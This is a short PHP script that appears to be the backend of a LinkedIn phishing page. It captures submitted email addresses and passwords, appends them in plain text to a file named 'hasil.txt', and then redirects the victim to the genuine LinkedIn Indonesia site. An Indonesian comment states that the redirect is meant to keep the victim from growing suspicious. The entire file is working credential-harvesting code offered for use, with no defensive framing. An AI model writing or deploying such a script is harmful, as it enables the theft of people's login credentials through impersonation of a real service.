<?php
$email = $_POST['email'];
$password = $_POST['password'];
$log = fopen("hasil.txt", "a");
fwrite($log, "Email: $email | Password: $password\n");
fclose($log);

// Redirect ke halaman asli agar tidak curiga
header("Location: https://id.linkedin.com/");
exit;
?>
